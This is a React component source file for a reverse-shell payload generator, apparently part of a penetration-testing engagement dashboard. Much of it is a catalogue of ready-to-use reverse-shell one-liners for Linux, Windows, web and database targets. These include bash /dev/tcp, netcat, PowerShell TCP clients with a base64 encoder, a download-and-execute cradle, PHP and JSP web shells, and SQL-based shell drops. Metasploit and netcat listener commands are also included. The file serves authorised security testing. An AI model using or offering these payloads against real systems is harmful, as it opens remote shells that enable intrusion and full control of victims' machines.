import { useState, useMemo } from 'react';
import {
  Box, Flex, Text, Heading, Input, Select, IconButton,
  Tooltip, Button,
} from '@chakra-ui/react';
import { CheckIcon, CopyIcon, SearchIcon } from '@chakra-ui/icons';
import { motion, AnimatePresence } from 'framer-motion';
import { useParams } from 'react-router-dom';
import { useEngagements } from '../../../contexts/EngagementContext';

const MotionBox = motion(Box);

// ── Colors ───────────────────────────────────────────────────────────────────
const ACCENT = '#9F7AEA';
const RED    = '#FC8181';
const GREEN  = '#68D391';
const BLUE   = '#63B3ED';
const ORANGE = '#F6AD55';
const CYAN   = '#76E4F7';
const YELLOW = '#ECC94B';

// ── Input styles ─────────────────────────────────────────────────────────────
const inputSx = {
  variant: 'unstyled', bg: 'rgba(255,255,255,0.05)',
  border: '1px solid rgba(255,255,255,0.1)', borderRadius: '10px',
  px: 4, h: '40px', fontSize: 'sm', color: 'var(--dash-text-primary)',
  fontFamily: "'Fira Code', monospace",
  _placeholder: { color: 'var(--dash-text-muted)' },
  _focus: { border: `1px solid ${ACCENT}80`, boxShadow: `0 0 0 1px ${ACCENT}40` },
};

// ── OS metadata ───────────────────────────────────────────────────────────────
const OS_META = {
  linux:    { label: 'Linux',    color: GREEN  },
  windows:  { label: 'Windows',  color: BLUE   },
  web:      { label: 'Web',      color: ORANGE },
  database: { label: 'Database', color: CYAN   },
};

// ── Shell catalogue ──────────────────────────────────────────────────────────
const SHELLS = [
  { id: 'bash-i',        os: 'linux',    name: 'Bash -i',             cmd: `bash -i >& /dev/tcp/{IP}/{PORT} 0>&1` },
  { id: 'bash-196',      os: 'linux',    name: 'Bash 196',            cmd: `exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do $line 2>&5 >&5; done` },
  { id: 'bash-read',     os: 'linux',    name: 'Bash read line',      cmd: `0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; sh <&196 >&196 2>&196` },
  { id: 'sh',            os: 'linux',    name: 'sh',                  cmd: `sh -i >& /dev/tcp/{IP}/{PORT} 0>&1` },
  { id: 'zsh',           os: 'linux',    name: 'zsh',                 cmd: `zsh -c 'zmodload zsh/net/tcp && ztcp {IP} {PORT} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'` },
  { id: 'python3',       os: 'linux',    name: 'Python3',             cmd: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("sh")'` },
  { id: 'python2',       os: 'linux',    name: 'Python2',             cmd: `python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` },
  { id: 'perl',          os: 'linux',    name: 'Perl',                cmd: `perl -e 'use Socket;$i="{IP}";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` },
  { id: 'ruby',          os: 'linux',    name: 'Ruby',                cmd: `ruby -rsocket -e'f=TCPSocket.open("{IP}",{PORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` },
  { id: 'lua',           os: 'linux',    name: 'Lua',                 cmd: `lua -e "require('socket');require('os');t=socket.tcp();t:connect('{IP}','{PORT}');os.execute('/bin/sh -i <&3 >&3 2>&3');"` },
  { id: 'awk',           os: 'linux',    name: 'AWK',                 cmd: `awk 'BEGIN{s="/inet/tcp/0/{IP}/{PORT}";for(;;){do{printf"$ "|&s;s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!="exit")close(s)}}' /dev/stdin` },
  { id: 'nc',            os: 'linux',    name: 'Netcat (nc)',          cmd: `nc -e /bin/sh {IP} {PORT}` },
  { id: 'nc-mkfifo',     os: 'linux',    name: 'Netcat mkfifo',       cmd: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {IP} {PORT} >/tmp/f` },
  { id: 'ncat',          os: 'linux',    name: 'ncat',                cmd: `ncat {IP} {PORT} -e /bin/bash` },
  { id: 'socat',         os: 'linux',    name: 'socat',               cmd: `socat TCP:{IP}:{PORT} EXEC:'bash -li'` },
  { id: 'socat-tty',     os: 'linux',    name: 'socat (TTY)',         cmd: `socat TCP:{IP}:{PORT} EXEC:'bash -li',pty,stderr,setsid,sigint,sane` },
  { id: 'golang',        os: 'linux',    name: 'Golang',              cmd: `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{IP}:{PORT}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go` },
  { id: 'ps1',           os: 'windows',  name: 'PowerShell #1',       cmd: `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` },
  { id: 'ps2',           os: 'windows',  name: 'PowerShell #2',       cmd: `powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('{IP}', {PORT});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0){$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"` },
  { id: 'ps-b64',        os: 'windows',  name: 'PowerShell Base64',   cmd: `powershell -e {B64}`, encode: 'base64-ps' },
  { id: 'ps-download',   os: 'windows',  name: 'PS Download Cradle',  cmd: `powershell -nop -c "(New-Object Net.WebClient).DownloadString('http://{IP}:{PORT}/shell.ps1') | IEX"` },
  { id: 'cmd-nc',        os: 'windows',  name: 'CMD + Netcat',        cmd: `nc.exe -e cmd.exe {IP} {PORT}` },
  { id: 'mshta',         os: 'windows',  name: 'mshta VBScript',      cmd: `mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -nop -c """"$client = New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""",0:close"` },
  { id: 'php-exec',      os: 'web',      name: 'PHP exec',            cmd: `php -r '$sock=fsockopen("{IP}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");'` },
  { id: 'php-shell',     os: 'web',      name: 'PHP web shell',       cmd: `<?php system($_GET['cmd']); ?>` },
  { id: 'php-monkey',    os: 'web',      name: 'PHP PentestMonkey',   cmd: `php -r '$sock=fsockopen("{IP}",{PORT});$proc=proc_open("/bin/sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'` },
  { id: 'jsp',           os: 'web',      name: 'JSP',                 cmd: `<% Runtime.getRuntime().exec(new String[]{"bash","-c","bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"}); %>` },
  { id: 'mssql-xp',     os: 'database', name: 'MSSQL xp_cmdshell',   cmd: `EXEC xp_cmdshell 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\\"{IP}\\",{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sb=(iex $data 2>&1|Out-String);$sb2=$sb+\\"PS \\"+(pwd).Path+\\"> \\";$sb_b=([text.encoding]::ASCII).GetBytes($sb2);$stream.Write($sb_b,0,$sb_b.Length);$stream.Flush()};$client.Close()}"'` },
  { id: 'mysql',         os: 'database', name: 'MySQL INTO OUTFILE',  cmd: `SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'` },
  { id: 'postgres',      os: 'database', name: 'PostgreSQL COPY',     cmd: `CREATE TABLE cmd_exec(cmd_output text);\nCOPY cmd_exec FROM PROGRAM 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1';\nSELECT * FROM cmd_exec;` },
];

// ── Listener catalogue ───────────────────────────────────────────────────────
const LISTENERS = [
  { id: 'nc',      name: 'Netcat',     cmd: `nc -lvnp {PORT}`,      color: GREEN  },
  { id: 'ncat',    name: 'ncat',       cmd: `ncat -lvnp {PORT}`,    color: GREEN  },
  { id: 'pwncat',  name: 'pwncat-cs',  cmd: `pwncat-cs -lp {PORT}`, color: ACCENT },
  { id: 'msf',     name: 'Metasploit', cmd: `msfconsole -q -x "use exploit/multi/handler; set payload generic/shell_reverse_tcp; set LHOST {IP}; set LPORT {PORT}; run"`, color: RED },
  { id: 'socat-l', name: 'socat',      cmd: `socat file:\`tty\`,raw,echo=0 tcp-listen:{PORT}`, color: CYAN },
];

const TTY_TIPS = [
  { label: 'Python pty',   cmd: `python3 -c 'import pty;pty.spawn("/bin/bash")'` },
  { label: 'Background',   cmd: `Ctrl+Z  →  stty raw -echo; fg  →  Enter x2` },
  { label: 'Terminal fix', cmd: `export TERM=xterm; stty rows 50 cols 220` },
];

// ── SVG icons ─────────────────────────────────────────────────────────────────
const TerminalIcon = (p) => (
  <Box as="svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"
    strokeLinecap="round" strokeLinejoin="round" {...p}>
    <polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/>
  </Box>
);
const SignalIcon = (p) => (
  <Box as="svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"
    strokeLinecap="round" strokeLinejoin="round" {...p}>
    <line x1="1" y1="1" x2="23" y2="23"/>
    <path d="M16.72 11.06A10.94 10.94 0 0 1 19 12.55"/><path d="M5 12.55a10.94 10.94 0 0 1 5.17-2.39"/>
    <path d="M10.71 5.05A16 16 0 0 1 22.56 9"/><path d="M1.42 9a15.91 15.91 0 0 1 4.7-2.88"/>
    <path d="M21.43 15.18A10 10 0 0 1 12 20"/><path d="M8.53 16.11a6 6 0 0 0 6.95 0"/>
    <line x1="12" y1="20" x2="12.01" y2="20"/>
  </Box>
);

// ── Copy button ───────────────────────────────────────────────────────────────
const CopyBtn = ({ text, size = 'xs' }) => {
  const [ok, setOk] = useState(false);
  const copy = () => { navigator.clipboard.writeText(text); setOk(true); setTimeout(() => setOk(false), 1800); };
  return (
    <Tooltip label={ok ? 'Copied!' : 'Copy'} fontSize="10px">
      <IconButton icon={ok ? <CheckIcon boxSize={2.5} /> : <CopyIcon boxSize={2.5} />}
        size={size} variant="ghost"
        color={ok ? GREEN : 'var(--dash-text-muted)'} borderRadius="7px"
        _hover={{ color: ok ? GREEN : 'white', bg: 'rgba(255,255,255,0.06)' }}
        onClick={copy} aria-label="Copy" />
    </Tooltip>
  );
};

// ── Command block ─────────────────────────────────────────────────────────────
const CommandBlock = ({ cmd, color, label }) => {
  const lines = (cmd || '').split('\n');
  return (
    <Box borderRadius="10px" overflow="hidden" border={`1px solid ${color}25`}>
      <Flex align="center" justify="space-between" px={3} py={2}
        bg={`${color}08`} borderBottom={`1px solid ${color}15`}>
        <Flex align="center" gap={2}>
          <TerminalIcon boxSize="11px" color={color} />
          <Text fontSize="9px" fontWeight="bold" color={color}
            textTransform="uppercase" letterSpacing="wider">{label}</Text>
        </Flex>
        <CopyBtn text={cmd} />
      </Flex>
      <Box bg="rgba(0,0,0,0.45)">
        <Flex>
          {lines.length > 1 && (
            <Box as="pre" py={3} px={2.5} textAlign="right" userSelect="none"
              borderRight={`1px solid ${color}10`} minW="36px"
              color="rgba(255,255,255,0.15)" fontSize="10px"
              fontFamily="'Fira Code', monospace" lineHeight="1.8">
              {lines.map((_, i) => <Box key={i}>{i + 1}</Box>)}
            </Box>
          )}
          <Box as="pre" flex="1" py={3} px={3} fontSize="12px"
            fontFamily="'Fira Code', 'Cascadia Code', 'Consolas', monospace"
            color="#a5f3fc" lineHeight="1.8" whiteSpace="pre-wrap" wordBreak="break-all">
            {cmd}
          </Box>
        </Flex>
      </Box>
    </Box>
  );
};

// ─────────────────────────────────────────────────────────────────────────────
//  Main component
// ─────────────────────────────────────────────────────────────────────────────
const ReverseShellView = () => {
  const { slug } = useParams();
  const { getBySlug } = useEngagements();
  const eng = getBySlug(slug);

  const [ip,       setIp]       = useState('');
  const [port,     setPort]     = useState('4444');
  const [osFilter, setOsFilter] = useState('linux');
  const [shellId,  setShellId]  = useState('bash-i');
  const [listener, setListener] = useState('nc');
  const [shellSearch, setShellSearch] = useState('');

  const filteredShells = useMemo(() =>
    SHELLS.filter(s => s.os === osFilter &&
      (!shellSearch || s.name.toLowerCase().includes(shellSearch.toLowerCase()))),
    [osFilter, shellSearch]
  );

  const selectedShell    = useMemo(() => SHELLS.find(s => s.id === shellId) || filteredShells[0], [shellId, filteredShells]);
  const selectedListener = LISTENERS.find(l => l.id === listener) || LISTENERS[0];
  const osColor          = OS_META[osFilter]?.color || ACCENT;

  const resolveCmd = (template) => {
    if (!template) return '';
    let cmd = template.replace(/\{IP\}/g, ip || 'YOUR_IP').replace(/\{PORT\}/g, port || 'YOUR_PORT');
    if (template.includes('{B64}')) {
      const inner = `$client = New-Object System.Net.Sockets.TCPClient('${ip || 'YOUR_IP'}',${port || 'YOUR_PORT'});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
      const utf16 = Array.from(inner).flatMap(c => [c.charCodeAt(0) & 0xff, (c.charCodeAt(0) >> 8) & 0xff]);
      cmd = `powershell -e ${btoa(String.fromCharCode(...utf16))}`;
    }
    return cmd;
  };

  const handleOsChange = (newOs) => {
    setOsFilter(newOs); setShellSearch('');
    const first = SHELLS.find(s => s.os === newOs);
    if (first) setShellId(first.id);
  };

  const shellCmd    = resolveCmd(selectedShell?.cmd);
  const listenerCmd = resolveCmd(selectedListener?.cmd);

  return (
    <Box h="100%" display="flex" flexDirection="column" overflow="hidden">

      {/* ── Header ── */}
      <Flex align="center" justify="space-between" px={6} py={4} flexShrink={0}
        borderBottom="1px solid var(--dash-card-border)">
        <Box>
          <Heading fontSize="2xl" fontWeight="bold" color="var(--dash-text-primary)" lineHeight={1.2}>
            Reverse <Text as="span" color="red.400">Shell</Text>
          </Heading>
          <Text fontSize="12px" color="var(--dash-text-secondary)" mt={1}>
            {eng?.name} · payload generator with listener commands
          </Text>
        </Box>

        {/* LHOST + LPORT inline in header */}
        <Flex gap={2} align="center">
          <Box>
            <Text fontSize="9px" fontWeight="bold" color="var(--dash-text-muted)"
              textTransform="uppercase" letterSpacing="wider" mb={1}>LHOST</Text>
            <Input {...inputSx} w="150px" h="36px" placeholder="10.10.10.10"
              value={ip} onChange={e => setIp(e.target.value)} />
          </Box>
          <Box>
            <Text fontSize="9px" fontWeight="bold" color="var(--dash-text-muted)"
              textTransform="uppercase" letterSpacing="wider" mb={1}>LPORT</Text>
            <Input {...inputSx} w="90px" h="36px" placeholder="4444"
              value={port} onChange={e => setPort(e.target.value)} />
          </Box>
        </Flex>
      </Flex>

      {/* ── Body ── */}
      <Flex flex={1} overflow="hidden">

        {/* ── Left: Shell picker ── */}
        <Box w="240px" flexShrink={0} borderRight="1px solid var(--dash-card-border)"
          display="flex" flexDirection="column" overflow="hidden">

          {/* OS tabs */}
          <Box p={3} borderBottom="1px solid var(--dash-card-border)" flexShrink={0}>
            <Flex gap={1} flexWrap="wrap">
              {Object.entries(OS_META).map(([key, m]) => (
                <Button key={key} size="xs" h="26px" px={3} borderRadius="6px"
                  fontSize="10px" fontWeight="bold"
                  bg={osFilter === key ? `${m.color}18` : 'transparent'}
                  border={`1px solid ${osFilter === key ? m.color + '50' : 'rgba(255,255,255,0.1)'}`}
                  color={osFilter === key ? m.color : 'var(--dash-text-muted)'}
                  _hover={{ borderColor: `${m.color}40`, color: m.color }}
                  onClick={() => handleOsChange(key)}>
                  {m.label}
                </Button>
              ))}
            </Flex>
          </Box>

          {/* Shell search */}
          <Box px={3} py={2} borderBottom="1px solid var(--dash-card-border)" flexShrink={0}>
            <Flex align="center" gap={2}
              bg="rgba(255,255,255,0.04)" borderRadius="7px"
              border="1px solid rgba(255,255,255,0.08)" px={2.5} h="30px">
              <SearchIcon boxSize={2.5} color="var(--dash-text-muted)" />
              <Input variant="unstyled" placeholder="Search shells…" fontSize="11px"
                color="var(--dash-text-primary)" _placeholder={{ color: 'var(--dash-text-muted)' }}
                value={shellSearch} onChange={e => setShellSearch(e.target.value)} />
            </Flex>
          </Box>

          {/* Shell list */}
          <Box flex={1} overflowY="auto"
            css={{ '&::-webkit-scrollbar': { width: '3px' }, '&::-webkit-scrollbar-thumb': { background: 'rgba(255,255,255,0.1)', borderRadius: '3px' } }}>
            {filteredShells.map(s => {
              const isActive = s.id === shellId;
              return (
                <Box key={s.id}
                  px={3} py={2} mx={1} mb={0.5} borderRadius="7px"
                  cursor="pointer"
                  bg={isActive ? `${osColor}12` : 'transparent'}
                  border={`1px solid ${isActive ? osColor + '35' : 'transparent'}`}
                  _hover={{ bg: isActive ? `${osColor}12` : 'rgba(255,255,255,0.04)' }}
                  onClick={() => setShellId(s.id)}
                  style={{ transition: 'all 0.12s' }}>
                  <Flex align="center" gap={2}>
                    {isActive && <Box w="5px" h="5px" borderRadius="full" bg={osColor} flexShrink={0} />}
                    <Text fontSize="12px" fontWeight={isActive ? 'semibold' : 'normal'}
                      color={isActive ? osColor : 'var(--dash-text-secondary)'}>
                      {s.name}
                    </Text>
                  </Flex>
                </Box>
              );
            })}
            {filteredShells.length === 0 && (
              <Flex align="center" justify="center" h="80px">
                <Text fontSize="11px" color="var(--dash-text-muted)">No shells found</Text>
              </Flex>
            )}

            {/* Listener section within left panel */}
            <Box mt={2} mx={1} pt={2} borderTop="1px solid var(--dash-card-border)">
              <Text fontSize="9px" fontWeight="bold" color="var(--dash-text-muted)"
                textTransform="uppercase" letterSpacing="wider" px={3} mb={1.5}>Listener</Text>
              {LISTENERS.map(l => (
                <Box key={l.id}
                  px={3} py={1.5} mb={0.5} borderRadius="7px"
                  cursor="pointer"
                  bg={listener === l.id ? `${l.color}12` : 'transparent'}
                  border={`1px solid ${listener === l.id ? l.color + '35' : 'transparent'}`}
                  _hover={{ bg: listener === l.id ? `${l.color}12` : 'rgba(255,255,255,0.04)' }}
                  onClick={() => setListener(l.id)}
                  style={{ transition: 'all 0.12s' }}>
                  <Flex align="center" gap={2}>
                    {listener === l.id && <Box w="5px" h="5px" borderRadius="full" bg={l.color} flexShrink={0} />}
                    <Text fontSize="12px" fontWeight={listener === l.id ? 'semibold' : 'normal'}
                      color={listener === l.id ? l.color : 'var(--dash-text-secondary)'}>
                      {l.name}
                    </Text>
                  </Flex>
                </Box>
              ))}
            </Box>
          </Box>
        </Box>

        {/* ── Right: Payload + listener ── */}
        <Box flex={1} overflowY="auto" px={5} py={4}
          css={{ '&::-webkit-scrollbar': { width: '3px' }, '&::-webkit-scrollbar-thumb': { background: 'rgba(255,255,255,0.1)', borderRadius: '3px' } }}>

          <AnimatePresence mode="wait">
            <MotionBox key={shellId}
              initial={{ opacity: 0, y: 6 }} animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -6 }} transition={{ duration: 0.15 }}>

              {/* ── Payload card ── */}
              <Box bg="var(--dash-card-bg)" border="1px solid var(--dash-card-border)"
                borderRadius="14px" p={5} mb={4} pos="relative" overflow="hidden">
                <Box pos="absolute" top={0} left={0} right={0} h="2px"
                  style={{ background: `linear-gradient(to right, transparent, ${osColor}80, transparent)` }} />

                <Flex align="center" justify="space-between" mb={4}>
                  <Flex align="center" gap={2}>
                    <Box w="3px" h="14px" borderRadius="full" bg={osColor} />
                    <Text fontSize="10px" fontWeight="bold" color="var(--dash-text-muted)"
                      textTransform="uppercase" letterSpacing="wider">Payload</Text>
                    <Box px="8px" py="1px" borderRadius="5px"
                      bg={`${osColor}12`} border={`1px solid ${osColor}30`}>
                      <Text fontSize="9px" fontWeight="bold" color={osColor}>{selectedShell?.name}</Text>
                    </Box>
                    <Box px="8px" py="1px" borderRadius="5px"
                      bg="rgba(255,255,255,0.05)" border="1px solid rgba(255,255,255,0.1)">
                      <Text fontSize="9px" fontWeight="bold" color="var(--dash-text-muted)">
                        {OS_META[osFilter]?.label}
                      </Text>
                    </Box>
                  </Flex>

                  {/* Shell type dropdown */}
                  <Select value={shellId} onChange={e => setShellId(e.target.value)}
                    bg="rgba(255,255,255,0.05)" borderColor="rgba(255,255,255,0.1)"
                    borderRadius="8px" h="32px" fontSize="11px" color="var(--dash-text-primary)"
                    focusBorderColor={`${osColor}80`} cursor="pointer" w="160px"
                    _hover={{ borderColor: `${osColor}40` }}
                    sx={{ '& option': { background: '#1a1a1f !important' } }}>
                    {SHELLS.filter(s => s.os === osFilter).map(s => (
                      <option key={s.id} value={s.id}>{s.name}</option>
                    ))}
                  </Select>
                </Flex>

                <CommandBlock cmd={shellCmd} color={osColor} label={`${OS_META[osFilter]?.label} · ${selectedShell?.name}`} />
              </Box>

              {/* ── Listener card ── */}
              <Box bg="var(--dash-card-bg)" border="1px solid var(--dash-card-border)"
                borderRadius="14px" p={5} mb={4} pos="relative" overflow="hidden">
                <Box pos="absolute" top={0} left={0} right={0} h="2px"
                  style={{ background: `linear-gradient(to right, transparent, ${selectedListener?.color || RED}60, transparent)` }} />

                <Flex align="center" gap={2} mb={4}>
                  <Box w="3px" h="14px" borderRadius="full" bg={selectedListener?.color || RED} />
                  <Text fontSize="10px" fontWeight="bold" color="var(--dash-text-muted)"
                    textTransform="uppercase" letterSpacing="wider">Listener</Text>
                  <Box px="8px" py="1px" borderRadius="5px"
                    bg={`${selectedListener?.color || RED}12`} border={`1px solid ${selectedListener?.color || RED}30`}>
                    <Text fontSize="9px" fontWeight="bold" color={selectedListener?.color || RED}>{selectedListener?.name}</Text>
                  </Box>
                </Flex>

                <CommandBlock cmd={listenerCmd} color={selectedListener?.color || RED} label={`${selectedListener?.name} Listener`} />

                {listener === 'pwncat' && (
                  <Text fontSize="11px" color="var(--dash-text-muted)" mt={3}>
                    After catching the shell, use{' '}
                    <Text as="span" fontFamily="mono" color={CYAN}>Ctrl+D</Text>
                    {' '}to background and drop to the pwncat-cs console.
                  </Text>
                )}
              </Box>

              {/* ── TTY Upgrade card ── */}
              <Box bg="var(--dash-card-bg)" border="1px solid var(--dash-card-border)"
                borderRadius="14px" p={5} pos="relative" overflow="hidden">
                <Box pos="absolute" top={0} left={0} right={0} h="2px"
                  style={{ background: `linear-gradient(to right, transparent, ${CYAN}40, transparent)` }} />

                <Flex align="center" gap={2} mb={4}>
                  <Box w="3px" h="14px" borderRadius="full" bg={CYAN} />
                  <SignalIcon boxSize="12px" color={CYAN} />
                  <Text fontSize="10px" fontWeight="bold" color="var(--dash-text-muted)"
                    textTransform="uppercase" letterSpacing="wider">TTY Upgrade</Text>
                  <Text fontSize="10px" color="var(--dash-text-muted)" fontWeight="normal">— run after catching the shell</Text>
                </Flex>

                {TTY_TIPS.map(t => (
                  <Flex key={t.label} align="center" gap={3} mb={2}
                    bg="rgba(255,255,255,0.02)" borderRadius="8px" px={3} py={2.5}>
                    <Text fontSize="9px" fontWeight="bold" color={CYAN} w="80px" flexShrink={0}
                      textTransform="uppercase" letterSpacing="wider">{t.label}</Text>
                    <Text as="pre" flex={1} fontSize="11px"
                      fontFamily="'Fira Code', monospace" color="#a5f3fc"
                      whiteSpace="pre-wrap" wordBreak="break-all">{t.cmd}</Text>
                    <CopyBtn text={t.cmd} />
                  </Flex>
                ))}
              </Box>

            </MotionBox>
          </AnimatePresence>
        </Box>
      </Flex>
    </Box>
  );
};

export default ReverseShellView;
